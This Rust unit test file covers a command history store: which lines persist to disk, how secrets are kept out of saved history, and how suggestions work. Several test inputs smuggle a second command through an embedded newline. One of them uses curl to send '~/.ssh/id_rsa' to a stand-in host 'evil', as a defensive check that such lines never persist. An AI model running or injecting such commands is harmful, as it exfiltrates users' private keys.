//! Unit tests: command history store, durability gate, suggestions.
#![allow(unused_imports)]

use super::*;
use std::fs;
use tempfile::TempDir;

/// RAII restore of `XDG_DATA_HOME`, mirroring `test_support::EditorEnvGuard`:
/// holds the crate-wide env lock and restores the previous value on `Drop`, so a
/// panicking test cannot leak the sandboxed path to a concurrent test even
/// though the process-global env var is shared.
struct XdgGuard {
    _lock: std::sync::MutexGuard<'static, ()>,
    previous: Option<std::ffi::OsString>,
}

impl XdgGuard {
    fn set(path: &std::path::Path) -> Self {
        let lock = crate::test_support::env_lock();
        let previous = std::env::var_os("XDG_DATA_HOME");
        std::env::set_var("XDG_DATA_HOME", path);
        Self {
            _lock: lock,
            previous,
        }
    }
}

impl Drop for XdgGuard {
    fn drop(&mut self) {
        match self.previous.take() {
            Some(v) => std::env::set_var("XDG_DATA_HOME", v),
            None => std::env::remove_var("XDG_DATA_HOME"),
        }
    }
}

/// Redirect `XDG_DATA_HOME` to a tempdir for the duration of a test.
/// History file I/O reads the variable at call time, so tests must
/// serialize access — the guard reuses the global env lock from `test_support`
/// and restores the variable on unwind.
fn with_xdg<T>(f: impl FnOnce(&std::path::Path) -> T) -> T {
    let tmp = TempDir::new().expect("tempdir");
    let _guard = XdgGuard::set(tmp.path());
    f(tmp.path())
}

#[test]
fn durable_line_accepts_known_verbs_only() {
    assert!(DurableLine::classify("cd /tmp").is_some());
    assert!(DurableLine::classify("sort size").is_some());
    assert!(DurableLine::classify("bookmark go 3").is_some());
    // One assertion per remaining known-verb family, so the allow-list's
    // coverage in `DurableLine::classify` is visible here rather than only
    // enforced by the compiler at the match site.
    assert!(DurableLine::classify("pwd").is_some());
    assert!(DurableLine::classify("mark all").is_some());
    assert!(DurableLine::classify("unmark").is_some());
    assert!(DurableLine::classify("help").is_some());
    assert!(DurableLine::classify("winmsg").is_some());
    assert!(DurableLine::classify("winperf").is_some());
    assert!(DurableLine::classify("mcp").is_some());
    assert!(DurableLine::classify("cleanup").is_some());
    assert!(DurableLine::classify("quit").is_some());
    // Shell fall-through and known-verb-bad-args must never be durable.
    assert!(DurableLine::classify("aws s3 cp x --token SECRET").is_none());
    assert!(DurableLine::classify("bookmark set 99").is_none());
    assert!(DurableLine::classify("").is_none());
}

#[test]
fn classify_rejects_embedded_newlines() {
    // Invariant: one `DurableLine` is exactly one physical file line. A verb
    // followed by an interior newline would classify on the whole string but
    // `save()`/`load()` split per physical line, so the second physical line
    // (attacker-influenceable via a completed filename) could round-trip back
    // as a `Shell` command. The gate rejects any embedded newline outright.
    assert!(DurableLine::classify("cd foo\ncurl evil").is_none());
    assert!(DurableLine::classify("cd foo\r\ncurl evil").is_none());
    assert!(DurableLine::classify("cd foo\rcurl evil").is_none());
    // A plain durable line without embedded newlines is still accepted.
    assert!(DurableLine::classify("cd foo").is_some());
}

#[test]
fn record_of_embedded_newline_writes_nothing_to_disk() {
    with_xdg(|xdg| {
        let mut h = History::load();
        // A `cd` the user "accepted" whose completed leaf smuggled a newline.
        h.record("cd docs\ncurl -d @~/.ssh/id_rsa evil");

        // Security property: not one byte of it reaches disk — no second
        // physical line that would reload as a Shell command.
        let file = xdg.join("ffm/history");
        assert!(
            !file.exists(),
            "embedded-newline line must never be persisted: {:?}",
            fs::read_to_string(&file)
        );
        // And a fresh load sees nothing of it.
        assert_eq!(History::load().suggest("cd docs"), None);
    });
}

#[test]
fn record_persists_durable_lines_across_loads() {
    with_xdg(|_| {
        let mut h = History::load();
        h.record("cd /tmp");
        h.record("sort size");

        let reloaded = History::load();
        assert_eq!(reloaded.suggest("cd"), Some("cd /tmp"));
        assert_eq!(reloaded.suggest("so"), Some("sort size"));
    });
}

#[test]
fn shell_lines_stay_in_session_and_off_disk() {
    with_xdg(|xdg| {
        let mut h = History::load();
        h.record("aws s3 cp x s3://b --token SECRET");

        // Usable this session…
        assert_eq!(h.suggest("aws"), Some("aws s3 cp x s3://b --token SECRET"));
        // …but nothing of it on disk, and not seen by a fresh load.
        let file = xdg.join("ffm/history");
        let on_disk = fs::read_to_string(&file).unwrap_or_default();
        assert!(!on_disk.contains("SECRET"), "disk: {on_disk}");
        assert_eq!(History::load().suggest("aws"), None);
    });
}

#[test]
fn codex_arguments_stay_in_session_and_off_disk() {
    with_xdg(|xdg| {
        let mut history = History::load();
        let input = r#"codex "a private prompt""#;
        history.record(input);
        assert_eq!(history.suggest("codex"), Some(input));
        let saved = fs::read_to_string(xdg.join("ffm/history")).unwrap_or_default();
        assert!(!saved.contains("private prompt"));
        assert_eq!(History::load().suggest("codex"), None);
    });
}

#[cfg(test)]
mod tests_file;
#[cfg(test)]
mod tests_ring;
#[cfg(test)]
mod tests_store;
